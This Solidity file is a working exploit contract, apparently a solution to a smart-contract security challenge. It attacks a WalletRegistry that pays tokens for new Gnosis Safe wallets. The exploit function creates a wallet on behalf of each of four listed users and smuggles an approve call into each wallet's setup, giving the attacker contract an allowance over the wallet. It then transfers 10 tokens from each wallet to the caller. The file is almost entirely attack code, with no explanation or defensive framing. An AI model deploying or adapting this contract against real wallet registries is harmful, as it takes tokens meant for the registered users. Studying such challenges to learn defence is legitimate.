// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "./GnosisSafeProxyFactory.sol";
import "./WalletRegistry.sol";

contract WalletRegistryAttacker {
    IERC20 immutable token;
    address attacker;

    GnosisSafeProxyFactory gnosisSafeProxyFactory;
    WalletRegistry victim;

    constructor(
        IERC20 token_,
        GnosisSafeProxyFactory gnosisSafeProxyFactory_,
        WalletRegistry victim_
    ) {
        token = token_;

        gnosisSafeProxyFactory = gnosisSafeProxyFactory_;

        victim = victim_;
    }

    function exploit(address[] memory users) external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory arrayOfUsers = new address[](1);
            arrayOfUsers[0] = users[i];

            bytes memory approveSelector = abi.encodeWithSignature(
                "approve(address)",
                address(this)
            );

            bytes memory selector = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                arrayOfUsers,
                1,
                address(this), // address(this),
                approveSelector, //abi.encodeWithSignature("approve(address)", address(this)),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy newProxy = gnosisSafeProxyFactory
                .createProxyWithCallback(
                    victim.masterCopy(),
                    selector,
                    i,
                    IProxyCreationCallback(victim)
                );

            token.transferFrom(address(newProxy), msg.sender, 10 ether);
        }
    }

    function approve(address walletRegistryAttacker) external {
        // Remember it is immutable :)
        token.approve(walletRegistryAttacker, 10 ether);
    }

    // Define a function to convert bytes4 to bytes
    function bytes4ToBytes(bytes4 input) internal pure returns (bytes memory) {
        bytes memory result = new bytes(32);
        assembly {
            mstore(add(result, 32), input)
        }
        return result;
    }

    fallback() external {}
}
